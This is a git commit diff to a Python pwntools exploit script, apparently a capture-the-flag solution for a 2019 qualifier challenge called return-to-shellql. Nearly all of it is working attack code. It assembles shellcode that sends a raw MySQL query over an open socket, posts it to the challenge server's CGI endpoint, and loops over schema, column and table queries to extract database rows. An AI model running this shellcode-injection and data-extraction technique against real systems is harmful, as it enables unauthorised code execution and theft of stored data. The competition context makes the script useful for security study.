1550f3a702deb8933cb921abdd43fa11a7aad790
Josh <c13joshua.christman@gmail.com>
2019-05-11 00:42:46 -0400

    - Some more data

--- return-to-shellql/win.py
+++ return-to-shellql/win.py
@@ -2,6 +2,7 @@
 from pwn import *
 import requests
 import re
+import sys
 
 context.arch = "amd64"
 context.os = "linux"
@@ -9,28 +10,39 @@ context.os = "linux"
 host = "http://shellretql.quals2019.oooverflow.io:9090/"
 html = """X-Powered-By: PHP/7.0.28-0ubuntu0.16.04.1\r\nContent-Type: text/html; charset=UTF-8\r\n\r\n<html><body>Hello World!</body></html>"""
 
-delimeter = 'scc'
-actual_query = 'SELECT table_name FROM information_schema.tables LIMIT 1 OFFSET 1'
-query = "select '%s',(%s),'%s';" % (delimeter, actual_query, delimeter[::-1])
+def query(q):
+    delimeter = 'scc'
+    _query = "select '%s',(%s),'%s';" % (delimeter, q, delimeter[::-1])
 
-shellcode = ""
-shellcode += shellcraft.echo(p16(len(query)) + "\x00\x00\x03" + query , 4)
-shellcode += shellcraft.read(4, 'rsp', 200)
-shellcode += shellcraft.pushstr(html)
-shellcode += shellcraft.write(1, 'rsp', 500)
+    shellcode = ""
+    shellcode += shellcraft.echo(p16(len(_query)) + "\x00\x00\x03" + _query , 4)
+    shellcode += shellcraft.read(4, 'rsp', 200)
+    shellcode += shellcraft.pushstr(html)
+    shellcode += shellcraft.write(1, 'rsp', 500)
 
-data = {
-  "shell": asm(shellcode) + "\x00"
-}
+    data = {
+      "shell": asm(shellcode) + "\x00"
+    }
 
-import pprint
-pprint.pprint(asm(shellcode))
+    resp = requests.post(host + "/cgi-bin/index.php", data=data)
+    data = resp.text.split(delimeter)
+    data = [x.split(delimeter[::-1])[0] for x in data]
 
-resp = requests.post(host + "/cgi-bin/index.php", data=data)
-data = resp.text.split(delimeter)
-data = [x.split(delimeter[::-1])[0] for x in data]
+    for match in data:
+        if not 'Hello World' in match and len(match) < 100:
+            sys.stdout.write(match)
+            sys.stdout.write('\n')
+            sys.stdout.flush()
 
-for match in data:
-    print 'Match:'
-    print match
-    print
+
+#for i in xrange(100):
+#    q = 'SELECT schema_name FROM information_schema.schemata LIMIT 1 OFFSET %i' % i
+#    query(q)
+
+#for i in xrange(600,1100):
+#    q = 'SELECT column_name FROM information_schema.columns LIMIT 1 OFFSET %i' % i
+#    query(q)
+
+for i in xrange(100):
+    q = 'SELECT ExploitNotes FROM shellql.Players LIMIT 1 OFFSET %i' % i
+    query(q)
